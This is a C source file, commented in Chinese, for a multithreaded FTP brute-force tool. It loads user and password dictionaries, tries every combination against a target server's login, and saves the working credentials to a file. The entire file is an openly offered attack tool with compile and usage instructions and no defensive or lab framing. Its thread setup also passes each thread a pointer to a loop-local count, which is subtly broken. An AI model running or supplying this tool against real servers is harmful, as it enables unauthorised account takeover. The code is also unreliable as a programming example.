/**
 * FTP 暴力破解工具 - 多线程优化版
 * 编译: gcc -o bt2 bt2.c -lpthread
 * 使用: ./bt2 <服务器IP> [端口] [用户字典] [密码字典] [结果文件] [线程数]
 * 默认: 端口=21, 用户字典=user.txt, 密码字典=pass.txt, 结果文件=ret.txt, 线程数=10
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <pthread.h>

#define BUFFER_SIZE 1024
#define MAX_LINE    512
#define TIMEOUT_SEC 5

/* 全局配置 */
char *server_ip;
int server_port = 21;
char *user_file = "user.txt";
char *pass_file = "pass.txt";
char *result_file = "ret.txt";
int num_threads = 10;

/* 共享计数 */
int total_tests = 0;
int success_count = 0;
pthread_mutex_t count_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t result_mutex = PTHREAD_MUTEX_INITIALIZER;

/* 函数声明 */
int create_tcp_socket(const char *host, int port);
int send_command(int sock, const char *cmd, char *response, size_t resp_size);
int test_login(int sock, const char *user, const char *pass);
int file_exists(const char *path);
int read_lines(const char *filename, char ***lines);
void free_lines(char **lines, int count);
void append_result(const char *user, const char *pass);

/* ---------- 创建 TCP 连接 ---------- */
int create_tcp_socket(const char *host, int port) {
    int sock;
    struct sockaddr_in server_addr;
    struct hostent *he;
    struct in_addr addr;

    if (inet_pton(AF_INET, host, &addr) == 1) {
        he = gethostbyaddr(&addr, sizeof(addr), AF_INET);
    } else {
        he = gethostbyname(host);
    }

    if (he == NULL) {
        fprintf(stderr, "[ERROR] 无法解析主机名或 IP: %s\n", host);
        return -1;
    }

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("[ERROR] socket");
        return -1;
    }

    struct timeval tv = {TIMEOUT_SEC, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    memcpy(&server_addr.sin_addr, he->h_addr_list[0], he->h_length);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("[ERROR] connect");
        close(sock);
        return -1;
    }
    return sock;
}

/* ---------- 发送命令并接收响应 ---------- */
int send_command(int sock, const char *cmd, char *response, size_t resp_size) {
    if (cmd) {
        if (send(sock, cmd, strlen(cmd), 0) == -1) {
            perror("[ERROR] send");
            return -1;
        }
    }
    memset(response, 0, resp_size);
    int bytes = recv(sock, response, resp_size - 1, 0);
    if (bytes <= 0) {
        if (bytes == 0)
            fprintf(stderr, "[INFO] 服务器关闭连接\n");
        else
            perror("[ERROR] recv");
        return -1;
    }
    response[bytes] = '\0';
    return bytes;
}

/* ---------- 测试登录 ---------- */
int test_login(int sock, const char *user, const char *pass) {
    char response[BUFFER_SIZE];
    char cmd[MAX_LINE];

    snprintf(cmd, sizeof(cmd), "USER %s\r\n", user);
    if (send_command(sock, cmd, response, sizeof(response)) <= 0)
        return 0;

    if (strncmp(response, "331", 3) != 0) {
        return (strncmp(response, "230", 3) == 0);
    }

    snprintf(cmd, sizeof(cmd), "PASS %s\r\n", pass);
    if (send_command(sock, cmd, response, sizeof(response)) <= 0)
        return 0;

    return (strncmp(response, "230", 3) == 0);
}

/* ---------- 文件存在检查 ---------- */
int file_exists(const char *path) {
    return access(path, F_OK) == 0;
}

/* ---------- 读取文件所有非空行 ---------- */
int read_lines(const char *filename, char ***lines) {
    FILE *fp;
    char buffer[MAX_LINE];
    int count = 0, capacity = 100;
    char **list = malloc(capacity * sizeof(char *));
    if (!list) {
        perror("[ERROR] malloc");
        return -1;
    }

    fp = fopen(filename, "r");
    if (!fp) {
        perror("[ERROR] fopen");
        free(list);
        return -1;
    }

    while (fgets(buffer, sizeof(buffer), fp)) {
        char *nl = strchr(buffer, '\n');
        if (nl) *nl = '\0';
        if (strlen(buffer) == 0) continue;

        if (count >= capacity) {
            capacity *= 2;
            char **new_list = realloc(list, capacity * sizeof(char *));
            if (!new_list) {
                perror("[ERROR] realloc");
                fclose(fp);
                free_lines(list, count);
                return -1;
            }
            list = new_list;
        }
        list[count] = strdup(buffer);
        if (!list[count]) {
            perror("[ERROR] strdup");
            fclose(fp);
            free_lines(list, count);
            return -1;
        }
        count++;
    }
    fclose(fp);
    *lines = list;
    return count;
}

/* ---------- 释放行数组 ---------- */
void free_lines(char **lines, int count) {
    for (int i = 0; i < count; i++)
        free(lines[i]);
    free(lines);
}

/* ---------- 追加结果 ---------- */
void append_result(const char *user, const char *pass) {
    FILE *fp = fopen(result_file, "a");
    if (!fp) {
        perror("[ERROR] 打开结果文件");
        return;
    }
    fprintf(fp, "[成功] 用户名: %s  密码: %s\n", user, pass);
    fclose(fp);
}

/* ---------- 线程工作函数 ---------- */
void *worker(void *arg) {
    char **users = ((char ***)arg)[0];
    int user_count = *(int *)(((char **)arg)[1]);
    char **passwords = ((char ***)arg)[2];
    int pass_count = *(int *)(((char **)arg)[3]);

    for (int i = 0; i < user_count; i++) {
        for (int j = 0; j < pass_count; j++) {
            pthread_mutex_lock(&count_mutex);
            int current = ++total_tests;
            pthread_mutex_unlock(&count_mutex);

            printf("[线程] [%d] 尝试: %s / %s ... ", current, users[i], passwords[j]);
            fflush(stdout);

            int sock = create_tcp_socket(server_ip, server_port);
            if (sock < 0) {
                printf("连接失败\n");
                sleep(1);
                continue;
            }

            char welcome[BUFFER_SIZE];
            send_command(sock, NULL, welcome, sizeof(welcome));

            int ok = test_login(sock, users[i], passwords[j]);
            close(sock);

            if (ok) {
                printf("✅ 成功!\n");
                pthread_mutex_lock(&result_mutex);
                append_result(users[i], passwords[j]);
                success_count++;
                pthread_mutex_unlock(&result_mutex);
            } else {
                printf("❌ 失败\n");
            }

            usleep(50000); // 50ms 延时
        }
    }
    return NULL;
}

/* ---------- 主程序 ---------- */
int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "用法: %s <服务器IP> [端口] [用户字典] [密码字典] [结果文件] [线程数]\n", argv[0]);
        fprintf(stderr, "默认: 端口=21, 字典=user.txt/pass.txt, 结果=ret.txt, 线程=10\n");
        return 1;
    }

    server_ip = argv[1];
    if (argc >= 3) server_port = atoi(argv[2]);
    if (argc >= 4) user_file = argv[3];
    if (argc >= 5) pass_file = argv[4];
    if (argc >= 6) result_file = argv[5];
    if (argc >= 7) num_threads = atoi(argv[6]);

    if (!file_exists(user_file)) {
        fprintf(stderr, "[ERROR] 用户字典 '%s' 不存在\n", user_file);
        return 1;
    }
    if (!file_exists(pass_file)) {
        fprintf(stderr, "[ERROR] 密码字典 '%s' 不存在\n", pass_file);
        return 1;
    }

    char **users, **passwords;
    int user_count = read_lines(user_file, &users);
    if (user_count <= 0) {
        fprintf(stderr, "[ERROR] 用户字典为空或读取失败\n");
        return 1;
    }
    int pass_count = read_lines(pass_file, &passwords);
    if (pass_count <= 0) {
        fprintf(stderr, "[ERROR] 密码字典为空或读取失败\n");
        free_lines(users, user_count);
        return 1;
    }

    printf("[INFO] 用户: %d, 密码: %d, 总尝试: %d, 线程: %d\n",
           user_count, pass_count, user_count * pass_count, num_threads);

    /* 清空结果文件 */
    FILE *rf = fopen(result_file, "w");
    if (rf) {
        time_t t = time(NULL);
        fprintf(rf, "FTP 暴力破解结果\n");
        fprintf(rf, "目标: %s:%d\n", server_ip, server_port);
        fprintf(rf, "时间: %s", ctime(&t));
        fprintf(rf, "----------------------------------------\n");
        fclose(rf);
    }

    /* 分配用户到各线程 */
    int users_per_thread = user_count / num_threads;
    int remainder = user_count % num_threads;

    pthread_t threads[num_threads];
    void *args[num_threads][4];

    int user_offset = 0;
    for (int t = 0; t < num_threads; t++) {
        int count = users_per_thread + (t < remainder ? 1 : 0);
        args[t][0] = &users[user_offset];
        args[t][1] = &count;
        args[t][2] = passwords;
        args[t][3] = &pass_count;
        user_offset += count;

        pthread_create(&threads[t], NULL, worker, args[t]);
    }

    for (int t = 0; t < num_threads; t++) {
        pthread_join(threads[t], NULL);
    }

    printf("\n[完成] 总共尝试 %d 次，成功 %d 个\n", total_tests, success_count);

    free_lines(users, user_count);
    free_lines(passwords, pass_count);
    return 0;
}

